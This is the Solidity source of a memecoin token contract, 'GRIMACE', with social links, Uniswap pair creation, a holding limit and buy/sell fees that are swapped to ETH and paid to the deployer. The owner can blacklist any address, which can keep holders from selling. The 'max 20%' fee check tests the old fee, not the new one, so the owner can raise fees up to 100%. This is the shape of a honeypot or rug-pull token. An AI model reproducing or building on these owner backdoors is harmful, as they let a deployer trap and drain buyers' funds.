/*

TELEGRAM: https://t.me/grimcoineth
TWITTER:  https://twitter.com/grimacecoineth
WEBSITE:  https://www.grimcoineth.com/

*/

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";

contract GRIMACE is ERC20, Ownable {

    IUniswapV2Router02 public immutable uniswapV2Router;
    address public immutable uniswapV2Pair;
    address public immutable deployer;
    uint256 public mintAmount = 1000000000000 * 10 ** decimals();
    uint256 public maxHoldingAmount = mintAmount / 100;
    uint256 public swapTokensAtAmount = mintAmount / 1000;
    uint256 public feeBps = 2000;
    bool public swapEnabled = true;
    bool public inSwapBack = false;
    bool public trading = false;
    bool public limitOn = true;

    mapping(address => bool) public blacklist;
    mapping(address => bool) public excluded;

    constructor() ERC20("GRIMACE", "GRIMACE") {
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        deployer = msg.sender;
        excluded[msg.sender] = true;
        _mint(msg.sender, mintAmount);
    }

    receive() external payable {}

    function setBlacklist(address _address, bool _isBlacklisted) external onlyOwner {
        blacklist[_address] = _isBlacklisted;
    }

    function setSwapEnabled(bool _swapEnabled) external onlyOwner {
        swapEnabled = _swapEnabled;
    }

    function setRule(bool _trade, bool _limitOn, uint256 _maxHoldingAmount, uint256 _feeBps) external onlyOwner {
        require(feeBps <= 2000, "max 20%");
        feeBps = _feeBps;
        trading = _trade;
        limitOn = _limitOn;
        maxHoldingAmount = _maxHoldingAmount;
    }

    function _transfer(address from, address to, uint256 amount) internal override {
        require(!blacklist[to] && !blacklist[from]);
        if (!trading) {
            require(excluded[from] || excluded[to]);
        } else {
            if (limitOn && from == uniswapV2Pair) {
                require(super.balanceOf(to) + amount <= maxHoldingAmount);
            }
        }

        uint256 contractTokenBalance = super.balanceOf(address(this));
        bool isBuy = (from == uniswapV2Pair);
        bool isSell = (to == uniswapV2Pair);
        bool canSwap = contractTokenBalance >= swapTokensAtAmount;

        if (!inSwapBack && canSwap && swapEnabled && isSell) {
            inSwapBack = true;
            swapTokensForEth(contractTokenBalance);
            inSwapBack = false;
        }

        if (!inSwapBack) {
            if (isSell) {
                uint256 fees = amount * feeBps / 10000;
                super._transfer(from, address(this), fees);
                amount -= fees;
            } else if (isBuy) {
          	    uint256 fees = amount * feeBps / 10000;
                super._transfer(from, address(this), fees);
                amount -= fees;
            }
        }

        super._transfer(from, to, amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private {

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        if (allowance(address(this), address(uniswapV2Router)) < tokenAmount) {
            _approve(address(this), address(uniswapV2Router), 2**256-1);
        }

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            deployer,
            block.timestamp
        );
    }
}
